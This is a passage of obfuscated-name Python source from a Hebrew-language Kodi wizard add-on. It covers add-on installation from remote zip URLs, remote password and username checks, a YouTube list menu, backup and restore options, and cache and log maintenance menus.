		if OO00O0O00OO0O00OO ==True :#line:2523
			OO00OOO000O0OO0OO =wiz .openURL (OOOO00O000000OO00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2524
			OO0O000OO000000O0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OOO00OO00O00000 ).findall (OO00OOO000O0OO0OO )#line:2525
			if len (OO0O000OO000000O0 )>0 :#line:2526
				for OOOO0OO00OO000OOO ,OOOO00O000000OO00 ,O0OOO000O0O00000O ,OO0OOO000000OOOO0 ,O0OO0OOO0000OOO00 ,O0OO0OO0O0O00O00O ,O0O0O0OO00OO00O0O ,O0000O0O000O00000 ,OO0OO0OOOO0O0O0OO in OO0O000OO000000O0 :#line:2527
					if os .path .exists (os .path .join (ADDONS ,O0OOO00OO00O00000 )):#line:2528
						OOOOOOOOOO0O000O0 =['Launch Addon','Remove Addon']#line:2529
						OO0O0O0OOO0OO000O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOOOOOOOOO0O000O0 )#line:2530
						if OO0O0O0OOO0OO000O ==0 :#line:2531
							wiz .ebi ('RunAddon(%s)'%O0OOO00OO00O00000 )#line:2532
							xbmc .sleep (1000 )#line:2533
							return True #line:2534
						elif OO0O0O0OOO0OO000O ==1 :#line:2535
							wiz .cleanHouse (os .path .join (ADDONS ,O0OOO00OO00O00000 ))#line:2536
							try :wiz .removeFolder (os .path .join (ADDONS ,O0OOO00OO00O00000 ))#line:2537
							except :pass #line:2538
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OOO00OO00O00000 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2539
								removeAddonData (O0OOO00OO00O00000 )#line:2540
							wiz .refresh ()#line:2541
							return True #line:2542
						else :#line:2543
							return False #line:2544
					O0000000O000O0000 =os .path .join (ADDONS ,O0OOO000O0O00000O )#line:2545
					if not O0OOO000O0O00000O .lower ()=='none'and not os .path .exists (O0000000O000O0000 ):#line:2546
						wiz .log ("Repository not installed, installing it")#line:2547
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0OOO00OO00O00000 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OOO000O0O00000O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2548
							O0OOOO00OOO000O00 =wiz .parseDOM (wiz .openURL (OO0OOO000000OOOO0 ),'addon',ret ='version',attrs ={'id':O0OOO000O0O00000O })#line:2549
							if len (O0OOOO00OOO000O00 )>0 :#line:2550
								O000O0OO0OO0O00OO ='%s%s-%s.zip'%(O0OO0OOO0000OOO00 ,O0OOO000O0O00000O ,O0OOOO00OOO000O00 [0 ])#line:2551
								wiz .log (O000O0OO0OO0O00OO )#line:2552
								if KODIV >=17 :wiz .addonDatabase (O0OOO000O0O00000O ,1 )#line:2553
								installAddon (O0OOO000O0O00000O ,O000O0OO0OO0O00OO )#line:2554
								wiz .ebi ('UpdateAddonRepos()')#line:2555
								wiz .log ("Installing Addon from Kodi")#line:2557
								OO000OOOO0O0O0OOO =installFromKodi (O0OOO00OO00O00000 )#line:2558
								wiz .log ("Install from Kodi: %s"%OO000OOOO0O0O0OOO )#line:2559
								if OO000OOOO0O0O0OOO :#line:2560
									wiz .refresh ()#line:2561
									return True #line:2562
							else :#line:2563
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0OOO000O0O00000O )#line:2564
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0OOO00OO00O00000 ,O0OOO000O0O00000O ))#line:2565
					elif O0OOO000O0O00000O .lower ()=='none':#line:2566
						wiz .log ("No repository, installing addon")#line:2567
						O00OO0O00OOOOO0O0 =O0OOO00OO00O00000 #line:2568
						O0OOO0O0000O00OO0 =OOOO00O000000OO00 #line:2569
						installAddon (O0OOO00OO00O00000 ,OOOO00O000000OO00 )#line:2570
						wiz .refresh ()#line:2571
						return True #line:2572
					else :#line:2573
						wiz .log ("Repository installed, installing addon")#line:2574
						OO000OOOO0O0O0OOO =installFromKodi (O0OOO00OO00O00000 ,False )#line:2575
						if OO000OOOO0O0O0OOO :#line:2576
							wiz .refresh ()#line:2577
							return True #line:2578
					if os .path .exists (os .path .join (ADDONS ,O0OOO00OO00O00000 )):return True #line:2579
					OO000OO00000O0000 =wiz .parseDOM (wiz .openURL (OO0OOO000000OOOO0 ),'addon',ret ='version',attrs ={'id':O0OOO00OO00O00000 })#line:2580
					if len (OO000OO00000O0000 )>0 :#line:2581
						OOOO00O000000OO00 ="%s%s-%s.zip"%(OOOO00O000000OO00 ,O0OOO00OO00O00000 ,OO000OO00000O0000 [0 ])#line:2582
						wiz .log (str (OOOO00O000000OO00 ))#line:2583
						if KODIV >=17 :wiz .addonDatabase (O0OOO00OO00O00000 ,1 )#line:2584
						installAddon (O0OOO00OO00O00000 ,OOOO00O000000OO00 )#line:2585
						wiz .refresh ()#line:2586
					else :#line:2587
						wiz .log ("no match");return False #line:2588
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2589
		else :wiz .log ("[Addon Installer] Text File: %s"%OO00O0O00OO0O00OO )#line:2590
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2591
def installFromKodi (OO0OOOO0O0OOOOO0O ,over =True ):#line:2593
	if over ==True :#line:2594
		xbmc .sleep (2000 )#line:2595
	wiz .ebi ('RunPlugin(plugin://%s)'%OO0OOOO0O0OOOOO0O )#line:2597
	if not wiz .whileWindow ('yesnodialog'):#line:2598
		return False #line:2599
	xbmc .sleep (1000 )#line:2600
	if wiz .whileWindow ('okdialog'):#line:2601
		return False #line:2602
	wiz .whileWindow ('progressdialog')#line:2603
	if os .path .exists (os .path .join (ADDONS ,OO0OOOO0O0OOOOO0O )):return True #line:2604
	else :return False #line:2605
def installAddon (O0000OO0O0OO0000O ,OOO0OOO0000O000O0 ):#line:2607
	if not wiz .workingURL (OOO0OOO0000O000O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0000OO0O0OO0000O ,COLOR2 ));return #line:2608
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2609
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OO0O0OO0000O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2610
	OO00O0OO0OO000O0O =OOO0OOO0000O000O0 .split ('/')#line:2611
	OO00O0O000OOOOO00 =os .path .join (PACKAGES ,OO00O0OO0OO000O0O [-1 ])#line:2612
	try :os .remove (OO00O0O000OOOOO00 )#line:2613
	except :pass #line:2614
	downloader .download (OOO0OOO0000O000O0 ,OO00O0O000OOOOO00 ,DP )#line:2615
	OO00O0O00OOOOO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OO0O0OO0000O )#line:2616
	DP .update (0 ,OO00O0O00OOOOO0OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2617
	O00OOO0OOO0O0OOOO ,O000000O0O0OO000O ,O0O0OO000OO0000O0 =extract .all (OO00O0O000OOOOO00 ,ADDONS ,DP ,title =OO00O0O00OOOOO0OO )#line:2618
	DP .update (0 ,OO00O0O00OOOOO0OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2619
	installed (O0000OO0O0OO0000O )#line:2620
	installDep (O0000OO0O0OO0000O ,DP )#line:2621
	DP .close ()#line:2622
	wiz .ebi ('UpdateAddonRepos()')#line:2623
	wiz .ebi ('UpdateLocalAddons()')#line:2624
	wiz .refresh ()#line:2625
def installDep (OO0O000O0OOOOO0OO ,DP =None ):#line:2627
	O00OO00O0O000O0O0 =os .path .join (ADDONS ,OO0O000O0OOOOO0OO ,'addon.xml')#line:2628
	if os .path .exists (O00OO00O0O000O0O0 ):#line:2629
		O0O000OOOOO0OOOO0 =open (O00OO00O0O000O0O0 ,mode ='r');O0O0000O00O0OOO00 =O0O000OOOOO0OOOO0 .read ();O0O000OOOOO0OOOO0 .close ();#line:2630
		OO0O0O0O00O0000OO =wiz .parseDOM (O0O0000O00O0OOO00 ,'import',ret ='addon')#line:2631
		for OOO0OO00000000O0O in OO0O0O0O00O0000OO :#line:2632
			if not 'xbmc.python'in OOO0OO00000000O0O :#line:2633
				if not DP ==None :#line:2634
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OO00000000O0O ))#line:2635
				wiz .createTemp (OOO0OO00000000O0O )#line:2636
def installed (O00O0OO0OO00O000O ):#line:2663
	OO00OOOO000OO0O0O =os .path .join (ADDONS ,O00O0OO0OO00O000O ,'addon.xml')#line:2664
	if os .path .exists (OO00OOOO000OO0O0O ):#line:2665
		try :#line:2666
			OO0O00O0O0OO0OO0O =open (OO00OOOO000OO0O0O ,mode ='r');O0OOO0O00OO0OO0O0 =OO0O00O0O0OO0OO0O .read ();OO0O00O0O0OO0OO0O .close ()#line:2667
			O0OOO0OO0OOO00OOO =wiz .parseDOM (O0OOO0O00OO0OO0O0 ,'addon',ret ='name',attrs ={'id':O00O0OO0OO00O000O })#line:2668
			O00000OO0OO0O0O0O =os .path .join (ADDONS ,O00O0OO0OO00O000O ,'icon.png')#line:2669
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOO0OO0OOO00OOO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00000OO0OO0O0O0O )#line:2670
		except :pass #line:2671
def youtubeMenu (url =None ):#line:2673
	if not YOUTUBEFILE =='http://':#line:2674
		if url ==None :#line:2675
			OOO0O0OO000O0000O =wiz .workingURL (YOUTUBEFILE )#line:2676
			O0OOO000O000O00OO =uservar .YOUTUBEFILE #line:2677
		else :#line:2678
			OOO0O0OO000O0000O =wiz .workingURL (url )#line:2679
			O0OOO000O000O00OO =url #line:2680
		if OOO0O0OO000O0000O ==True :#line:2681
			O0000O0000OOOOO00 =wiz .openURL (O0OOO000O000O00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2682
			O0OOOOOO0O0000OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000O0000OOOOO00 )#line:2683
			if len (O0OOOOOO0O0000OO0 )>0 :#line:2684
				for O0OOOOO0000O00O00 ,O0OOO0O00OO0000OO ,url ,O000O0O0OO00O0000 ,OOO0O0O00OO0OO000 ,O0O0O0000O000000O in O0OOOOOO0O0000OO0 :#line:2685
					if O0OOO0O00OO0000OO .lower ()=="yes":#line:2686
						addDir ("[B]%s[/B]"%O0OOOOO0000O00O00 ,'youtube',url ,description =O0O0O0000O000000O ,icon =O000O0O0OO00O0000 ,fanart =OOO0O0O00OO0OO000 ,themeit =THEME3 )#line:2687
					else :#line:2688
						addFile (O0OOOOO0000O00O00 ,'viewVideo',url =url ,description =O0O0O0000O000000O ,icon =O000O0O0OO00O0000 ,fanart =OOO0O0O00OO0OO000 ,themeit =THEME2 )#line:2689
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2690
		else :#line:2691
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2692
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2693
			addFile ('%s'%OOO0O0OO000O0000O ,'',themeit =THEME3 )#line:2694
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2695
	setView ('files','viewType')#line:2696
def STARTP ():#line:2697
	OO000O00000OO00O0 =(ADDON .getSetting ("pass"))#line:2698
	if BUILDNAME =="":#line:2699
	 if not NOTIFY =='true':#line:2700
          O0OO0O0OO00OO00O0 =wiz .workingURL (NOTIFICATION )#line:2701
	 if not NOTIFY2 =='true':#line:2702
          O0OO0O0OO00OO00O0 =wiz .workingURL (NOTIFICATION2 )#line:2703
	 if not NOTIFY3 =='true':#line:2704
          O0OO0O0OO00OO00O0 =wiz .workingURL (NOTIFICATION3 )#line:2705
	O0O0OOOO00OOOOOO0 =OO000O00000OO00O0 #line:2706
	O0OO0O0OO00OO00O0 =urllib2 .Request (SPEED )#line:2707
	OOO0000OO000OOO0O =urllib2 .urlopen (O0OO0O0OO00OO00O0 )#line:2708
	O000OO0OOO0OOOOOO =OOO0000OO000OOO0O .readlines ()#line:2710
	OO000000O00OO0O0O =0 #line:2714
	for OOOO0OOOOOO0OO0O0 in O000OO0OOO0OOOOOO :#line:2715
		if OOOO0OOOOOO0OO0O0 .split (' ==')[0 ]==OO000O00000OO00O0 or OOOO0OOOOOO0OO0O0 .split ()[0 ]==OO000O00000OO00O0 :#line:2716
			OO000000O00OO0O0O =1 #line:2717
			break #line:2718
	if OO000000O00OO0O0O ==0 :#line:2719
					O00OOO0OOO000O00O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2720
					if O00OOO0OOO000O00O :#line:2722
						ADDON .openSettings ()#line:2724
						sys .exit ()#line:2726
					else :#line:2727
						sys .exit ()#line:2728
	return 'ok'#line:2732
def STARTP2 ():#line:2733
	OOOO00O0O0OOO0OOO =(ADDON .getSetting ("user"))#line:2734
	OO00O0000O0OO0000 =(UNAME )#line:2736
	O00O00O0000000O0O =urllib2 .urlopen (OO00O0000O0OO0000 )#line:2737
	OOO00OO0OOOOOO0O0 =O00O00O0000000O0O .readlines ()#line:2738
	OOO000O000000OO00 =0 #line:2739
	for OOOOOO0000OO00O0O in OOO00OO0OOOOOO0O0 :#line:2742
		if OOOOOO0000OO00O0O .split (' ==')[0 ]==OOOO00O0O0OOO0OOO or OOOOOO0000OO00O0O .split ()[0 ]==OOOO00O0O0OOO0OOO :#line:2743
			OOO000O000000OO00 =1 #line:2744
			break #line:2745
	if OOO000O000000OO00 ==0 :#line:2746
		OO000O0O0OOOO0O00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2747
		if OO000O0O0OOOO0O00 :#line:2749
			ADDON .openSettings ()#line:2751
			sys .exit ()#line:2754
		else :#line:2755
			sys .exit ()#line:2756
	return 'ok'#line:2760
def passandpin ():#line:2761
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2762
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2763
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2764
def passandUsername ():#line:2765
	ADDON .openSettings ()#line:2766
def folderback ():#line:2769
    OO0O000O0OO00OOOO =ADDON .getSetting ("path")#line:2770
    if OO0O000O0OO00OOOO :#line:2771
      OO0O000O0OO00OOOO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2772
      ADDON .setSetting ("path",OO0O000O0OO00OOOO )#line:2773
def backmyupbuild ():#line:2776
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2781
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2785
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2786
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2788
def maintMenu (view =None ):#line:2792
	OOO0O0O0OO0000000 ='[B][COLOR green]ON[/COLOR][/B]';OOO0OOOO0O0OOOO0O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2794
	OO0OO0OOO0000OOO0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2795
	O0OOOOOOO0O000OO0 ='true'if AUTOCACHE =='true'else 'false'#line:2796
	O0OO0O00O0OO0OO0O ='true'if AUTOPACKAGES =='true'else 'false'#line:2797
	O00OOO0OO0OOOO000 ='true'if AUTOTHUMBS =='true'else 'false'#line:2798
	OOOOO0O00OOO00000 ='true'if SHOWMAINT =='true'else 'false'#line:2799
	O00000O0O0OOO0OO0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2800
	OOOOOOO0OOOO0OOOO ='true'if INCLUDEALL =='true'else 'false'#line:2801
	O00O0OO0O000O0OOO ='true'if THIRDPARTY =='true'else 'false'#line:2802
	if wiz .Grab_Log (True )==False :OOO0O0OOOOO00OO00 =0 #line:2803
	else :OOO0O0OOOOO00OO00 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2804
	if wiz .Grab_Log (True ,True )==False :O000OOOO00OO0O0O0 =0 #line:2805
	else :O000OOOO00OO0O0O0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2806
	OOO0OO0OOO00O00OO =int (OOO0O0OOOOO00OO00 )+int (O000OOOO00OO0O0O0 )#line:2807
	O0OO0OO00O000O0O0 =str (OOO0OO0OOO00O00OO )+' Error(s) Found'if OOO0OO0OOO00O00OO >0 else 'None Found'#line:2808
	O000O0000O00O0OO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2809
	if OOOOOOO0OOOO0OOOO =='true':#line:2810
		O0OO0O0O00OO00O0O ='true'#line:2811
		OO00O0OO00OO0O000 ='true'#line:2812
		O000O0OO0O0OOOOO0 ='true'#line:2813
		O0O000O0OO0O0O00O ='true'#line:2814
		OOO00OOOO0O0OOOO0 ='true'#line:2815
		OO0OOOOOO00OO00OO ='true'#line:2816
		OO0OOOOO000OOO000 ='true'#line:2817
		OO0OO0000OOOOOO0O ='true'#line:2818
	else :#line:2819
		O0OO0O0O00OO00O0O ='true'if INCLUDEBOB =='true'else 'false'#line:2820
		OO00O0OO00OO0O000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2821
		O000O0OO0O0OOOOO0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2822
		O0O000O0OO0O0O00O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2823
		OOO00OOOO0O0OOOO0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2824
		OO0OOOOOO00OO00OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2825
		OO0OOOOO000OOO000 ='true'if INCLUDESALTS =='true'else 'false'#line:2826
		OO0OO0000OOOOOO0O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2827
	O000O0O0O0OOOO000 =wiz .getSize (PACKAGES )#line:2828
	OOOOO0000OOOOOOOO =wiz .getSize (THUMBS )#line:2829
	O000O000O00OO00O0 =wiz .getCacheSize ()#line:2830
	OO0O00OOOO0OO0OO0 =O000O0O0O0OOOO000 +OOOOO0000OOOOOOOO +O000O000O00OO00O0 #line:2831
	O0OOOOOO00OO000OO =['Daily','Always','3 Days','Weekly']#line:2832
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2833
	if view =="clean"or SHOWMAINT =='true':#line:2834
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O00OOOO0OO0OO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O000O00OO00O0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O0O0O0OOOO000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOO0000OOOOOOOO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2842
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2843
	if view =="addon"or SHOWMAINT =='false':#line:2844
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2851
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2852
	if view =="misc"or SHOWMAINT =='true':#line:2853
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('View Errors in Log: %s'%(O0OO0OO00O000O0O0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('Clear Wizard Log File%s'%O000O0000O00O0OO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2862
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2863
	if view =="backup"or SHOWMAINT =='true':#line:2864
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2876
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2877
	if view =="tweaks"or SHOWMAINT =='true':#line:2878
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2879
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		else :#line:2881
			if os .path .exists (ADVANCED ):#line:2882
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2883
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2884
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2891
	addFile ('Show All Maintenance: %s'%OOOOO0O00OOO00000 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2892
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2893
	addFile ('Third Party Wizards: %s'%O00O0OO0O000O0OOO .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2894
	if O00O0OO0O000O0OOO =='true':#line:2895
		O0OO0OOO00OO0OOO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2896
		OO00O0000OOO0O000 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2897
		OOOO0O00000000O0O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2898
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO0OOO00OO0OOO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2899
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00O0000OOO0O000 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO0O00000000O0O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2901
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2902
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0OO0OOO0000OOO0 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2903
	if OO0OO0OOO0000OOO0 =='true':#line:2904
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0OOOOOO00OO000OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OOOOOOO0O000OO0 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2906
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OO0O00O0OO0OO0O .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2907
